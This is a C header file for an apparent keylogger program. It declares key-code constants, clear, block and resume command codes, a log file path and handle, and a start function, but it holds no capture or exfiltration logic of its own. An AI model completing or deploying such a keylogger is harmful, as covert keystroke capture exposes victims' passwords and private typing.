#ifndef __KEYLOGGER_H
#define __KEYLOGGER_H

#define KEY_EMPTY -1
#define KEY_CAPS 0x14
#define KEY_SHIFT 0xA0
#define KEY_BACKSPACE 0x8
#define KEY_SPACE 0x20
#define KEY_ENTER 0xD
#define KEY_TAP 0x9

#define KEYLOGGER_CMD_CLEAR 0x1
#define KEYLOGGER_CMD_BLOCK 0x2
#define KEYLOGGER_CMD_RESUME 0x0

extern char* keylogger_path;
extern int keylogger_cmd;
extern FILE *flog;
extern void keylogger_Start(void);

#endif
